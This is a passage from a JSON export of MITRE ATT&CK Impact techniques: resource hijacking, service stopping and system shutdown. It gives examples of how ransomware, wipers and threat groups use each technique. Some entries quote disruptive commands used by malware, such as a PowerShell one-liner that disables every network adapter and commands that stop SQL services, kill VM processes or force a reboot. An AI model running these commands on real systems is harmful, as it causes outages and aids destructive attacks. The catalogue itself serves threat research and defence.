within an environment or cluster.\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it\u2019s not competing for resources.", "id": "T1496.001", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 deployed a Monero cryptocurrency mining tool in a victim\u2019s environment."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used XMRIG to mine cryptocurrency on victim systems."}, {"id": "S0486", "name": "Bonadan", "description": "Bonadan can download an additional module which has a cryptocurrency mining extension."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner has loaded coinmining software onto systems to mine for Koto cryptocurrency. "}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate can deploy follow-on cryptocurrency mining payloads."}, {"id": "S0601", "name": "Hildegard", "description": "Hildegard has used xmrig to mine cryptocurrency."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has the capability to run a cryptocurrency miner on the victim machine."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has created and run a Bitcoin cryptocurrency miner."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner harvested system resources to mine cryptocurrency, using XMRig to mine Monero."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can use system resources to mine cryptocurrency, dropping XMRig to mine Monero."}, {"id": "G0106", "name": "Rocke", "description": "Rocke has distributed cryptomining malware."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap is a kernel-mode rootkit used for cryptocurrency mining."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has deployed XMRig Docker images to mine cryptocurrency. TeamTNT has also infected Docker containers and Kubernetes clusters with XMRig, and used RainbowMiner and lolMiner for mining cryptocurrency."}]}, {"name": "Bandwidth Hijacking", "description": "Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.", "detailed_description": "Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability.\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate Network Denial of Service campaigns and/or to seed malicious torrents. Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services. Finally, they may engage in internet-wide scanning in order to identify additional targets for compromise.\nIn addition to incurring potential financial costs or availability disruptions, this technique may cause reputational damage if a victim\u2019s bandwidth is used for illegal activities.", "id": "T1496.002", "examples": []}, {"name": "SMS Pumping", "description": "Adversaries may leverage messaging services for SMS pumping, which may impact system and/or hosted service availability. SMS pumping is a type of telecommunications fraud whereby a threat actor first obtains a set of phone numbers from a telecommunications provider, then leverages a victim\u2019s messaging infrastructure to send large amounts of SMS messages to numbers in that set. By generating SMS traffic to their phone number set, a threat actor may earn payments from the telecommunications provider.", "detailed_description": "Adversaries may leverage messaging services for SMS pumping, which may impact system and/or hosted service availability. SMS pumping is a type of telecommunications fraud whereby a threat actor first obtains a set of phone numbers from a telecommunications provider, then leverages a victim\u2019s messaging infrastructure to send large amounts of SMS messages to numbers in that set. By generating SMS traffic to their phone number set, a threat actor may earn payments from the telecommunications provider.\nThreat actors often use publicly available web forms, such as one-time password (OTP) or account verification fields, in order to generate SMS traffic. These fields may leverage services such as Twilio, AWS SNS, and Amazon Cognito in the background. In response to the large quantity of requests, SMS costs may increase and communication channels may become overwhelmed.", "id": "T1496.003", "examples": []}, {"name": "Cloud Service Hijacking", "description": "Adversaries may leverage compromised software-as-a-service (SaaS) applications to complete resource-intensive tasks, which may impact hosted service availability.", "detailed_description": "Adversaries may leverage compromised software-as-a-service (SaaS) applications to complete resource-intensive tasks, which may impact hosted service availability.\nFor example, adversaries may leverage email and messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification Service (SNS), SendGrid, and Twilio, in order to send large quantities of spam / Phishing emails and SMS messages. Alternatively, they may engage in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted AI models.\nIn some cases, adversaries may leverage services that the victim is already using. In others, particularly when the service is part of a larger cloud platform, they may first enable the service. Leveraging SaaS applications may cause the victim to incur significant financial costs, use up service quotas, and otherwise impact availability.", "id": "T1496.004", "examples": []}]}, {"name": "Service Stop", "description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.", "detailed_description": "Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as MSExchangeIS, which will make Exchange content inaccessible. In some cases, adversaries may stop or disable many or all services to render systems unusable. Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.", "id": "T1489", "examples": [{"id": "S0640", "name": "Avaddon", "description": "Avaddon looks for and attempts to stop database processes."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has terminated specific processes before encryption."}, {"id": "S0638", "name": "Babuk", "description": "Babuk can stop specific services related to backups."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat has the ability to stop VM services on compromised networks."}, {"id": "S1096", "name": "Cheerscrypt", "description": "Cheerscrypt has the ability to terminate VM processes on compromised hosts through execution of esxcli vm process kill."}, {"id": "S0611", "name": "Clop", "description": "Clop can kill several processes and services related to backups and security solutions."}, {"id": "S0575", "name": "Conti", "description": "Conti can stop up to 146 Windows services related to security, backup, database, and email solutions through the use of net stop."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has a hardcoded list of services and processes to terminate."}, {"id": "S0659", "name": "Diavol", "description": "Diavol will terminate services using the Service Control Manager (SCM) API."}, {"id": "S0605", "name": "EKANS", "description": "EKANS stops database, data backup solution, antivirus, and ICS-related processes."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to stop the Volume Shadow Copy service."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to stop services on the infected host."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can issue a command to kill a process on compromised hosts."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used PsExec to stop services prior to the execution of ransomware."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer\u2019s data wiper module writes zeros into the registry keys in SYSTEM\\CurrentControlSet\\Services to render a system inoperable."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk terminates various processes to get the user to reboot the victim machine."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has shut down virtual machines from within a victim's on-premise VMware ESXi infrastructure."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has stopped the MSExchangeIS service to render Exchange contents inaccessible to users."}, {"id": "S0582", "name": "LookBack", "description": "LookBack can kill processes and delete services."}, {"id": "S0449", "name": "Maze", "description": "Maze has stopped SQL services to ensure it can encrypt any database."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex can stop and disable services on the system."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can disconnect all network adapters on a compromised host using powershell -Command \"Get-WmiObject -class Win32_NetworkAdapter | ForEach { If ($.NetEnabled) { $.Disable() } }\" > NUL."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker can terminate system processes and services, some of which relate to backup software."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer uses the API call ChangeServiceConfigW to disable all services on the affected system."}, {"id": "S0556", "name": "Pay2Key", "description": "Pay2Key can stop the MS SQL service at the end of the encryption process to release files locked by the service."}, {"id": "S1058", "name": "Prestige", "description": "Prestige has attempted to stop the MSSQL Windows service to ensure successful encryption using C:\\Windows\\System32\\net.exe stop MSSQLSERVER."}, {"id": "S0583", "name": "Pysa", "description": "Pysa can stop services and processes."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has attempted to stop services associated with business applications and databases to release the lock on files used by these applications so they may be encrypted."}, {"id": "S0496", "name": "REvil", "description": "REvil has the capability to stop services and kill processes."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP can disable critical services and processes."}, {"id": "S0400", "name": "RobbinHood", "description": "RobbinHood stops 181 Windows services on the system before beginning the encryption process."}, {"id": "S1073", "name": "Royal", "description": "Royal can use RmShutDown to kill  applications and services using the resources that are targeted for encryption."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has called kill.bat for stopping services, disabling services and killing processes."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team attempts to stop the MSSQL Windows service to ensure successful encryption of locked files."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has the capability to stop processes and services."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry attempts to kill processes associated with Exchange, Microsoft SQL Server, and MySQL to make it possible to encrypt their data stores."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used taskkill.exe and net.exe to stop backup, catalog, cloud, and other services prior to network encryption."}], "sub_techniques": []}, {"name": "System Shutdown/Reboot", "description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. reload).", "detailed_description": "Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via Network Device CLI (e.g. reload).\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as Disk Structure Wipe or Inhibit System Recovery, to hasten the intended effects on system availability.", "id": "T1529", "examples": [{"id": "S1125", "name": "AcidRain", "description": "AcidRain reboots the target system once the various wiping processes are complete."}, {"id": "S1133", "name": "Apostle", "description": "Apostle reboots the victim machine following wiping and related activity."}, {"id": "G0067", "name": "APT37", "description": "APT37 has used malware that will issue the command shutdown /r /t 1 to reboot a system after wiping its MBR."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker\u2019s Linux variant has terminated ESXi virtual machines."}, {"id": "S1136", "name": "BFG Agonizer", "description": "BFG Agonizer uses elevated privileges to call NtRaiseHardError to induce a \"blue screen of death\" on infected systems, causing a system crash. Once shut down, the system is no longer bootable."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can reboot or shutdown the targeted system or logoff the current user."}, {"id": "S1033", "name": "DCSrv", "description": "DCSrv has a function to sleep for two hours before rebooting the system."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can initiate a system shutdown."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk attempts to reboot the machine by terminating specific processes."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has the ability to restart compromised hosts."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has rebooted systems after destroying files and wiping the MBR on infected systems."}, {"id": "S0372", "name": "LockerGoga", "description": "LockerGoga has been observed shutting down infected systems."}, {"id": "S0582", "name": "LookBack", "description": "LookBack can shutdown and reboot the victim machine."}, {"id": "S0449", "name": "Maze", "description": "Maze has issued a shutdown command on a victim machine that, upon reboot, will run the ransomware within a VM."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper reboots the infected system following wiping and related tasks to prevent system recovery."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya will reboot the system one hour after infection."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer will shut down the compromised system after it is done modifying system configuration settings."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon will reboot the infected system once the wiping functionality has been completed."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can shutdown a compromised host through execution of ExitWindowsEx with the EXW_SHUTDOWN flag."}], "sub_techniques": []}]}]}